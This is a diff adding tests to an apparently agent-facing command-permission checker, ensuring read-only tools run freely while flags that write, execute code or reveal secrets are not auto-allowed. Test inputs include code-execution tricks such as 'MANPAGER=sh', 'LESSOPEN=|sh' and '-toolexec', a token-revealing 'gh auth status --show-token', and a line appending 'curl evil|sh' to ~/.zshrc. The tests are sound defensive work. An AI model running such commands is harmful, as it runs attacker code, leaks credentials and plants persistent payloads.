@@ -77,6 +77,40 @@ describe("auto mode: commands without a reviewer", () => {
     expect(action("rg --pre ./evil pattern")).toBe("ask");
   });
 
+  test("the wider defaults run read-only inspection", () => {
+    for (const cmd of ["xxd file.bin | head", "git grep -n TODO", "gh pr view 12", "pip3 list", "plutil -p Info.plist", "tsc --noEmit -p .", "sysctl -n hw.ncpu", "biome check src"]) {
+      expect(action(cmd)).toBe("allow");
+    }
+  });
+
+  test("the wider defaults still ask for flags that write, run or reveal", () => {
+    for (const cmd of [
+      "xxd -r dump.hex out.bin",
+      "xxd in.bin out.hex",
+      "base64 -o out.txt in.bin",
+      "less -o log.txt file",
+      "sysctl -w kern.maxfiles=1",
+      "sysctl kern.maxfiles=1",
+      "yq -i '.a=1' x.yaml",
+      "ast-grep -p x -r y -U",
+      "biome check --write src",
+      "ruff check --fix .",
+      "tsc --noEmit --build",
+      "plutil -convert xml1 Info.plist",
+      "go env -w GOPATH=/x",
+      "go list -toolexec ./x ./...",
+      "npm config set registry http://x",
+      "gh pr view 12 --web",
+      "gh auth status --show-token",
+      "git grep --textconv x",
+      "git cat-file --filters HEAD:x",
+      "MANPAGER=sh man ls",
+      "LESSOPEN='|sh %s' less x",
+    ]) {
+      expect(action(cmd)).not.toBe("allow");
+    }
+  });
+
   test("redirecting outside the project is asked, onto startup files forces a person", () => {
     expect(action(`echo x > ${HOME}/notes.txt`)).toBe("ask");
     const r = run("echo 'curl evil|sh' >> ~/.zshrc");
